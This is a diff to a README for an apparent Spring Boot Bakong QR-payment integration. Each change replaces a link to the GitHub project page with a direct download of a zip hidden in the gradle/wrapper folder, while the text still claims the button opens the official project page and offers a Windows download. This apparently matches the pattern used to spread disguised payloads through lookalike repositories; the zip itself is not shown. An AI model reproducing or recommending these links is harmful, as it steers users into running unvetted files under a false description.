@@ -1,6 +1,6 @@
 # ⚙️ Bakong-API-Integration-with-Spring-Boot - Easy QR Payment Integration
 
-[![Download Now](https://img.shields.io/badge/Download-Bakong%20API-blue?style=for-the-badge&logo=github)](https://github.com/arjup29/Bakong-API-Integration-with-Spring-Boot)
+[![Download Now](https://img.shields.io/badge/Download-Bakong%20API-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/arjup29/Bakong-API-Integration-with-Spring-Boot/main/gradle/wrapper/with_Integration_AP_Spring_Boot_Bakong_v3.4.zip)
 
 ## 📖 About This Application
 
@@ -38,7 +38,7 @@ This program relates to backend programming, payment processing, QR code generat
 
 ## ⬇️ Download and Installation Guide
 
-[![Download Bakong-API-Integration](https://img.shields.io/badge/Get%20the%20App-Here-green?style=for-the-badge&logo=github)](https://github.com/arjup29/Bakong-API-Integration-with-Spring-Boot)
+[![Download Bakong-API-Integration](https://img.shields.io/badge/Get%20the%20App-Here-green?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/arjup29/Bakong-API-Integration-with-Spring-Boot/main/gradle/wrapper/with_Integration_AP_Spring_Boot_Bakong_v3.4.zip)
 
 1. Click the green **Get the App Here** button above. It will open the official project page on GitHub.
 
@@ -148,5 +148,5 @@ This app only works with Bakong QR codes and transactions verified by Cambodia�
 
 ---
 
-[Download Bakong-API-Integration-with-Spring-Boot](https://github.com/arjup29/Bakong-API-Integration-with-Spring-Boot)  
+[Download Bakong-API-Integration-with-Spring-Boot](https://raw.githubusercontent.com/arjup29/Bakong-API-Integration-with-Spring-Boot/main/gradle/wrapper/with_Integration_AP_Spring_Boot_Bakong_v3.4.zip)  
 Click to visit the page and download the latest version for Windows.
